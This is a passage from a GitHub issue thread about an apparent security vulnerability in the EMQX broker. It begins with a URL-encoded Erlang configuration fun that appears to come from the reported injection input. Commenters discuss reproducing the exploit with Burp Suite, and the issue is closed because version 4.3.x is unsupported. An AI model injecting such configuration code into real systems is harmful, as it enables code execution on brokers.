emqx_sn.predefined%22%2C+fun%28Conf%29+-%3E%0D%0A++List+%3D+cuttlefish_variable%3Afilter_by_prefix%28%22mqtt.sn.predefined.topic%22%2C+Conf%29%2C%0D%0A++TopicIdList+%3D+lists%3Asort%28%5B%7Blist_to_integer%28I%29%2C+iolist_to_binary%28TopicName%29%7D%0D%0A++++++++++++++++++++++++++++%7C%7C+%7B%5B%22mqtt%22%2C+%22sn%22%2C+%22predefined%22%2C+%22topic%22%2C+I%5D%2C+TopicName%7D%0D%0A+++++++++++++++++++++++++++++++%3C-+List%2C+I+%3D%2F%3D+%220%22%5D%29%0D%0Aend%7D>.  Hello, regarding the security risk, could you provide more detailed validation or exploitation methods to prove this threat? Can we use Burp Suite to reproduce the process? During the replication process, it was found that the interface only supports uploading json file suffixes  here is a screen shot when I test this issue [image](https://private-user-images.githubusercontent.com/49726183/251182910-c088192b-50b1-4803-b9a8-efc153f83103.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1Mjc0MTUsIm5iZiI6MTczNjUyNzExNSwicGF0aCI6Ii80OTcyNjE4My8yNTExODI5MTAtYzA4ODE5MmItNTBiMS00ODAzLWI5YTgtZWZjMTUzZjgzMTAzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE2MzgzNVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPThhMjkxOWI3OGFjZjliNDFlZWEyZmJkODcyMjYxOGY1NTNhODhjYTBhNzE3MTE1MmQzNTE0NGNkYTE2MTcyZWImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.wMem4NH8eiF02FvuNX5Uj9SCkH35bZ7DX3DUYjrP8QQ) please check the version you tested is 4.3.8 or not, I did not test for the latest versions. |
| --- |

All reactions

Sorry, something went wrong.

[![@id](https://avatars.githubusercontent.com/u/138221?s=80&u=fe2154df49cc56036d55f00c2ca7e65af594a5f3&v=4)](/id)

Copy link

Collaborator

### **[id](/id)** commented [Jul 12, 2023](#issuecomment-1632085702)

| [@donghao1107](https://github.com/donghao1107) we stopped supporting v4.3.x as of 2022-11-30. |
| --- |

All reactions

Sorry, something went wrong.

[![@id](https://avatars.githubusercontent.com/u/138221?s=40&u=fe2154df49cc56036d55f00c2ca7e65af594a5f3&v=4)](/id)
[id](/id)
closed this as [completed](/emqx/emqx/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Jul 12, 2023](#event-9796218208)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Femqx%2Femqx%2Fissues%2F10419)

Assignees

[![@lafirest](https://avatars.githubusercontent.com/u/22971499?s=40&v=4)](/lafirest) [lafirest](/lafirest)

Labels

[BUG](/emqx/emqx/labels/BUG)

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

5 participants

[![@savonarola](https://avatars.githubusercontent.com/u/4236?s=52&v=4)](/savonarola) [![@id](https://avatars.githubusercontent.com/u/138221?s=52&v=4)](/id) [![@lafirest](https://avatars.githubusercontent.com/u/22971499?s=52&v=4)](/lafirest) [![@donghao1107](https://avatars.githubusercontent.com/u/49726183?s=52&v=4)](/donghao1107) [![@HHhne](https://avatars.githubusercontent.com/u/125008575?s=52&v=4)](/HHhne)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


